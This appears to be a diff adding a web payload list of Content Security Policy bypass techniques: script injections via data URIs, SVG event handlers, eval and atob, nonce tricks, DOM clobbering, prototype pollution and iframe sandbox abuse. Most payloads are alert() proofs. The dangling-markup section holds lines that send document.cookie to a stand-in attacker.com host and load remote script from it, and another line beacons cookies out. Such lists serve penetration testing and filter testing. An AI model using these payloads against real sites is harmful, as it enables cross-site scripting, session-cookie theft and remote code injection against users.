@@ -1,0 +1,61 @@
+# Content Security Policy (CSP) Bypass Techniques - 2025 Edition
+
+# script-src bypasses
+<script src="data:application/javascript,alert(1)"></script>
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<link rel=import href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
+
+# unsafe-inline bypasses
+<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">
+<svg><script>alert(document.domain)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate attributeName=x dur=1s onbegin=alert(1)>
+<svg><animate attributeName=x dur=1s onend=alert(1)>
+<svg><set attributeName=x dur=1s onbegin=alert(1)>
+<svg><set attributeName=x dur=1s onend=alert(1)>
+
+# nonce/hash bypasses
+<script nonce=BYPASS>alert(1)</script>
+<script nonce=STOLEN_NONCE>alert(1)</script>
+<script>setTimeout('alert(1)')</script>
+<script>setTimeout(atob('YWxlcnQoMSk='))</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# Dangling markup injection
+<img src='https://attacker.com/?
+<script>fetch('https://attacker.com/?cookie='+document.cookie)</script>
+<script src="https://attacker.com/xss.js"></script>
+
+# JSONP/CORS bypasses
+<script src="https://trusted-cdn.com/jsonp?callback=alert(1)"></script>
+<script>fetch('https://vulnerable-cors-site.com').then(r=>r.json()).then(data=>alert(JSON.stringify(data)))</script>
+
+# DOM clobbering
+<form id=alert name=alert><input name=call>
+<img name=body id=body src=x>
+<a id=body><a id=body name=innerHTML href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+
+# Prototype pollution
+<script>
+Object.prototype.vulnerable = 'javascript:alert(1)';
+</script>
+
+# Trusted Types bypasses
+<script>
+trustedTypes.createPolicy('bypass', {createHTML: s => s}).createHTML('<img src=x onerror=alert(1)>');
+</script>
+
+# iframe sandbox bypasses
+<iframe sandbox="allow-scripts allow-same-origin" srcdoc="<script>alert(document.domain)</script>"></iframe>
+
+# Meta tag CSP bypasses
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
+<script>alert(1)</script>
+
+# report-uri exploitation
+<img src=x onerror="navigator.sendBeacon('/csp-report', document.cookie)">
+
+# frame-ancestors bypass
+<iframe src="javascript:alert(parent.document.domain)"></iframe>
